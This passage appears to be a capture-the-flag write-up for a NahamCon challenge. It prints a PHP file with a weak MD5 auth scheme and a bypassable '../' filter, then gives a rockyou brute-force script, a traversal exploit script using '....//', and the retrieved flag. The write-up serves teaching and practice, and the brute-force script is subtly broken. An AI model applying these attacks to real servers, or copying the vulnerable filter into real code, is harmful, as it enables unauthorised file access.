    "has_pages": false,
    "has_discussions": false,
    "forks_count": 0,
    "mirror_url": null,
    "archived": false,
    "disabled": false,
    "open_issues_count": 0,
    "license": null,
    "allow_forking": true,
    "is_template": false,
    "web_commit_signoff_required": false,
    "topics": [

    ],
    "visibility": "private",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "default_branch": "main",
    "permissions": {
      "admin": true,
      "maintain": true,
      "push": true,
      "triage": true,
      "pull": true
    }
  }
]
```

</details>

Got <https://github.com/NahamConIndustries/server-code.git> so let's clone.

```console
$ git clone --quiet https://github_pat_11BIS(snip)@github.com/NahamConIndustries/server-code

$ tree server-code
server-code
├── index.php
└── README.md

1 directory, 2 files
```

<details><summary>server-code/index.php</summary>

```php
<?php
//change this in production
$secret = 'abcdefgh';

function jsonResponse($arr,$code){
    http_response_code($code);
    echo json_encode($arr);
    if( $code === 200 ){
        file_put_contents('request_log.txt','PASS: '.$_SERVER["REQUEST_URI"]."\n", FILE_APPEND );
    }else{
        file_put_contents('request_log.txt','FAIL: '.$_SERVER["REQUEST_URI"]."\n", FILE_APPEND );
    }

    exit();
}

function auth($type,$location,$secret){
    return md5($type.$location.$secret );
}
if( isset($_GET["type"],$_GET["location"],$_GET["auth"]) ){
    $_GET["location"] = str_replace('../','',$_GET["location"]);
    if( auth($_GET["type"],$_GET["location"],$secret) === $_GET["auth"] ) {
        if ($_GET["type"] === 'listing') {
            if (is_dir($_GET["location"])) {
                jsonResponse(array(
                    'app' => 'server-code',
                    'data' => scandir($_GET["location"])
                ), 200);
            } else {
                jsonResponse(array(
                    'app' => 'server-code',
                    'error' => 'Invalid Location'
                ), 400);
            }
        } elseif ($_GET["type"] === 'contents') {
            if( $_GET["location"] === '/flag.txt' ){
                jsonResponse(array(
                    'app' => 'server-code',
                    'error' => 'You are not allowed to view this file'
                ), 403);
            }
            if (file_exists($_GET["location"])) {
                jsonResponse(array(
                    'app' => 'server-code',
                    'data' => file_get_contents($_GET["location"])
                ), 200);
            } else {
                jsonResponse(array(
                    'app' => 'server-code',
                    'error' => 'Invalid Location'
                ), 400);
            }
        } else {
            jsonResponse(array(
                'app' => 'server-code',
                'error' => 'Invalid Request Type'
            ), 400);
        }
    }else{
        jsonResponse(array(
            'app' => 'server-code',
            'error' => 'Invalid auth parameter'
        ), 400);
    }
}else {
    jsonResponse(array(
        'app' => 'server-code',
        'error' => 'Missing Required Input'
    ), 400);
}
```

</details>

Bruteforce for `$secret`:

```python
from hashlib import md5
from concurrent.futures import ThreadPoolExecutor
import requests

BASE_URL = "http://challenge.nahamcon.com:30781"

s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080"}


def load_wordlist(wordlist):
    print("[+] load wordlist")

    with open(wordlist, "r", encoding="latin-1") as f:
        words = f.read().splitlines()


def brute(words):
    def hash_and_request(word):
        hash = md5(f"listing.{word}".encode()).hexdigest()
        resp = s.get(f"{BASE_URL}/cmd/?type=listing&location=.&auth={hash}")
        return word, resp.text

    print("[+] start request")
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for result in executor.map(hash_and_request, words):
            word, resp = result

            print(word, end="\r")

            if "Invalid auth parameter" not in resp:
                print(f"got it: {word}\n\n")


if __name__ == "__main__":
    words = load_wordlist("/usr/share/wordlists/rockyou.txt")

    brute(words)
```

Got secret `the_25mission`.

In server-code/index.php, we know that `../` is being replaced with an empty string, so `....//` is replaced with `../`.
Using this, we can retrieve `/flag.txt` using a relative path.

exploit.sh

```bash
#!/bin/bash

type=${1:-listing}
file=${2:-.}

replaced_file=$(echo "${file}" | sed -e 's|\.\./||g')
echo ${replaced_file}

auth=$(echo -n "${type}${replaced_file}the_25mission" | md5sum | cut -d' ' -f 1)

echo $auth
curl "http://challenge.nahamcon.com:30781/cmd/?type=${type}&location=${file}&auth=${auth}"
```

Result:

```console
$ ./exploit.sh contents "....//....//....//....//....//flag.txt"
../../../../../flag.txt
{"app":"server-code","data":"flag{b96caf012c197fae8252c14658406390}"} 
```

The flag is accepted as the last Take A Peak challenge
